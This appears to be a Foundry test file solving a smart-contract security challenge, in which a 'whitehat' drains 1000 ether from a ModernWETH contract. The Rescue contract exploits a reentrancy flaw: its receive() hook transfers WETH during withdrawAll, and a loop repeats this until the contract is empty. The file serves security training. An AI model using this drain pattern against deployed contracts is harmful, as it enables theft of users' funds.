// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        Rescue rescue = new Rescue(address(modernWETH), whitehat);

        while(address(whitehat).balance < 1010 ether){
            rescue.attack{value:10 ether}();
            modernWETH.withdrawAll();
        }

        
        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}

contract Rescue{
    ModernWETH public modernWETH;
    address whitehat;

    constructor(address _target, address _wh){
        modernWETH = ModernWETH(_target);
        whitehat = _wh;
    }

    receive() external payable{
        if(address(modernWETH).balance >= msg.value) {
            modernWETH.transfer(whitehat, msg.value);
            whitehat.call{value: address(this).balance}("");
        }
    }

    function attack() public payable{
        require(msg.sender == whitehat, "non");
        modernWETH.deposit{value: msg.value}();
        modernWETH.withdrawAll();
    }

}